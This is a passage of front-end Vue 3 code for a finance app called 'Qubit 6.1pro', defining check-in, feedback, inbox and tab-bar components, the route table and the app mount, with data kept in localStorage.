          // Notification API 轻提示（不依赖后台推送）
          if ('Notification' in window && Notification.permission === 'granted') {
            new Notification('Credit Memo', { body: 'Reminder set for ' + creditMemoList.value[creditMemoList.value.length-1].name });
          } else if ('Notification' in window && Notification.permission !== 'denied') {
            Notification.requestPermission().catch(() => {});
          }
        }

        return {
          dca, dcaResult,
          cal, calendarEvents, addCalendarEvent,
          loan, loanResult,
          profit, profitResult,
          rev, revResult,
          pwd,
          credit, creditMemoList, saveCreditMemo,
          formatMoney,
        };
      }
    };

                <div style="width:56px;height:56px;border-radius:50%;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;">
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
                </div>
                <h2 style="font-size:18px;font-weight:800;">Qubit Labs</h2>
                <p style="font-size:13px;color:var(--text-secondary);margin-top:4px;">Built by a small team of engineers and designers passionate about making financial insights accessible to everyone.</p>
              </div>
              <div class="card" style="font-size:14px;line-height:1.7;color:var(--text);">
                <p style="margin-bottom:12px;">We are a distributed team of developers, data analysts, and product thinkers who believe that sophisticated market tools shouldn't require a Wall Street budget.</p>
                <p style="margin-bottom:12px;">Our mission is to simplify the complexity of financial markets through clean design, local-first computation, and transparent principles.</p>
                <p>Every feature in Qubit 6.1pro is crafted with privacy in mind—your data stays on your device.</p>
              </div>
            </div>
          </div>
        </div>
      `,
    };

    // ---------- 月度签到 ----------
    const CheckInPage = {
      name: 'CheckInPage',
      template: `
        <div class="page">
          <div class="back-row">
            <button @click="$router.back()"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg></button>
            <h1>Monthly Check-in</h1>
          </div>
          <div class="page-scroll">
            <div class="px-4 py-4">
              <div class="checkin-status">
                <div class="big-num">{{ checkinCount }}</div>
                <div class="label">Consecutive Days</div>
              </div>
              <div class="calendar mt-4">
                <div class="cal-header">
                  <button @click="prevMonth"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg></button>
                  <span style="font-size:15px;font-weight:700;">{{ monthLabel }}</span>
                  <button @click="nextMonth"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></button>
                </div>
                <div class="cal-grid">
                  <div v-for="d in ['S','M','T','W','T','F','S']" :key="'d'+d" class="cal-day-name">{{ d }}</div>
                  <div
                    v-for="(day, i) in calendarDays" :key="'day'+i"
                    class="cal-day"
                    :class="{ empty: day === null, today: day === today, checked: day && checkins.includes(day) }"
                  >{{ day }}</div>
                </div>
              </div>
              <button class="btn-primary mt-4" @click="doCheckIn" :disabled="checkins.includes(today)">Check In</button>
            </div>
          </div>
        </div>
      `,
      setup() {
        const today = new Date().getDate();
        const now = new Date();
        const year = ref(now.getFullYear());
        const month = ref(now.getMonth());

        // 从 localStorage 读取签到记录
        const storageKey = 'checkin_' + year.value + '_' + month.value;
        const checkins = ref(JSON.parse(localStorage.getItem(storageKey) || '[]'));
        const checkinCount = computed(() => checkins.value.length);

        const monthLabel = computed(() => {
          const m = ['January','February','March','April','May','June','July','August','September','October','November','December'];
          return m[month.value] + ' ' + year.value;
        });

        const calendarDays = computed(() => {
          const first = new Date(year.value, month.value, 1);
          const startDay = first.getDay();
          const daysInMonth = new Date(year.value, month.value + 1, 0).getDate();
          const arr = [];
          for (let i = 0; i < startDay; i++) arr.push(null);
          for (let d = 1; d <= daysInMonth; d++) arr.push(d);
          return arr;
        });

        function prevMonth() {
          if (month.value === 0) { month.value = 11; year.value--; }
          else month.value--;
          loadCheckins();
        }
        function nextMonth() {
          if (month.value === 11) { month.value = 0; year.value++; }
          else month.value++;
          loadCheckins();
        }
        function loadCheckins() {
          const key = 'checkin_' + year.value + '_' + month.value;
          checkins.value = JSON.parse(localStorage.getItem(key) || '[]');
        }

        function doCheckIn() {
          if (checkins.value.includes(today)) return;
          checkins.value.push(today);
          const key = 'checkin_' + year.value + '_' + month.value;
          localStorage.setItem(key, JSON.stringify(checkins.value));
          showToast('Check-in successful');
        }

        return {
          today, year, month, checkins, checkinCount, monthLabel, calendarDays,
          prevMonth, nextMonth, doCheckIn,
        };
      }
    };

    // ---------- 反馈 ----------
    const FeedbackPage = {
      name: 'FeedbackPage',
      template: `
        <div class="page">
          <div class="back-row">
            <button @click="$router.back()"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg></button>
            <h1>Feedback</h1>
          </div>
          <div class="page-scroll">
            <div class="feedback-form">
              <div class="form-group">
                <label>Title</label>
                <input type="text" v-model.trim="title" placeholder="Enter a title" maxlength="100">
              </div>
              <div class="form-group">
                <label>Content</label>
                <textarea v-model.trim="content" placeholder="Describe your feedback..." rows="6" maxlength="1000"></textarea>
              </div>
              <button class="btn-primary" :disabled="!canSubmit" @click="submit">Send</button>
            </div>
          </div>
        </div>
      `,
      setup() {
        const title = ref('');
        const content = ref('');
        const router = useRouter();
        const canSubmit = computed(() => title.value.length > 0 && content.value.length > 0);

        function submit() {
          if (!canSubmit.value) return;
          showToast('Sent successfully');
          title.value = '';
          content.value = '';
          router.back();
        }

        return { title, content, canSubmit, submit };
      }
    };

    // ---------- 站内信件 ----------
    const InboxPage = {
      name: 'InboxPage',
      template: `
        <div class="page">
          <div class="back-row">
            <button @click="$router.back()"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg></button>
            <h1>Inbox</h1>
          </div>
          <div class="page-scroll">
            <div
              v-for="msg in messages" :key="msg.id"
              class="inbox-item"
              @click="openMessage(msg)"
            >
              <div class="inbox-icon">
                <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
              </div>
              <div style="flex:1;min-width:0;">
                <div class="inbox-title">{{ msg.title }}</div>
                <div class="inbox-preview">{{ msg.content.slice(0, 60) }}...</div>
              </div>
            </div>
          </div>

          <!-- 信件弹窗 -->
          <div v-if="activeMsg" class="modal-overlay" @click.self="activeMsg = null">
            <div class="modal-box">
              <h3 style="font-size:17px;font-weight:700;margin-bottom:12px;">{{ activeMsg.title }}</h3>
              <p style="font-size:14px;line-height:1.7;color:var(--text-secondary);">{{ activeMsg.content }}</p>
              <button class="btn-primary mt-4" @click="activeMsg = null">Close</button>
            </div>
          </div>
        </div>
      `,
      setup() {
        const messages = ref([
          {
            id: 1,
            title: 'Welcome',
            content: 'Welcome to Qubit 6.1pro! We are thrilled to have you on board. Explore market insights, use the built-in financial tools, and stay on top of your portfolio—all with complete privacy. If you ever need help, our team is just an email away.',
          }
        ]);
        const activeMsg = ref(null);
        function openMessage(msg) {
          activeMsg.value = msg;
        }
        return { messages, activeMsg, openMessage };
      }
    };

    /* ============================================================
       路由配置
       ============================================================ */
    const routes = [
      { path: '/', redirect: '/loading' },
      { path: '/loading', name: 'Loading', component: LoadingPage },
      { path: '/home', name: 'Home', component: HomePage },
      { path: '/stock/:ticker', name: 'StockDetail', component: StockDetailPage },
      { path: '/top-gainers', name: 'TopGainers', component: createRankPage('Top Gainers', 10) },
      { path: '/top-losers', name: 'TopLosers', component: createRankPage('Top Losers', 5) },
      { path: '/most-active', name: 'MostActive', component: createRankPage('Most Active', 8) },
      { path: '/potential', name: 'Potential', component: createRankPage('Potential', 6) },
      { path: '/today-picks', name: 'TodayPicks', component: createRankPage("Today's Picks", 10) },
      { path: '/not-recommended', name: 'NotRecommended', component: createRankPage('Not Recommended', 10) },
      { path: '/watchlist', name: 'Watchlist', component: createRankPage('Watchlist', 10) },
      { path: '/guide', name: 'Guide', component: GuidePage },
      { path: '/toolbox', name: 'Toolbox', component: ToolboxPage },
      { path: '/settings', name: 'Settings', component: SettingsPage },
      { path: '/version', name: 'Version', component: VersionPage },
      { path: '/privacy', name: 'Privacy', component: PrivacyPage },
      { path: '/terms', name: 'Terms', component: TermsPage },
      { path: '/about-team', name: 'AboutTeam', component: AboutTeamPage },
      { path: '/check-in', name: 'CheckIn', component: CheckInPage },
      { path: '/feedback', name: 'Feedback', component: FeedbackPage },
      { path: '/inbox', name: 'Inbox', component: InboxPage },
      { path: '/:pathMatch(.*)*', redirect: '/home' },
    ];

    const router = createRouter({
      history: createWebHashHistory(),
      routes,
    });

    /* ============================================================
       Tab Bar 组件
       ============================================================ */
    const TabBar = {
      name: 'TabBar',
      template: `
        <nav class="tab-bar">
          <router-link
            v-for="tab in tabs" :key="tab.path"
            :to="tab.path"
            class="tab-item"
          >
            <svg v-html="tab.icon"></svg>
            <span>{{ tab.label }}</span>
          </router-link>
        </nav>
      `,
      setup() {
        const tabs = [
          {
            path: '/home',
            label: 'Home',
            icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>',
          },
          {
            path: '/toolbox',
            label: 'Toolbox',
            icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>',
          },
          {
            path: '/settings',
            label: 'Settings',
            icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>',
          },
        ];
        return { tabs };
      }
    };

    /* ============================================================
       根组件 & 挂载
       ============================================================ */
    const App = {
      components: { TabBar },
      setup() {
        return { showTabBar, toast };
      },
      template: `
        <router-view v-slot="{ Component }">
          <transition name="fade-slide" mode="out-in">
            <component :is="Component" />
          </transition>
        </router-view>
        <TabBar v-if="showTabBar" />
        <div v-if="toast" class="toast-overlay">{{ toast }}</div>
      `,
    };

    const app = createApp(App);
    app.use(router);
    app.mount('#app');
  </script>
</body>
</html>
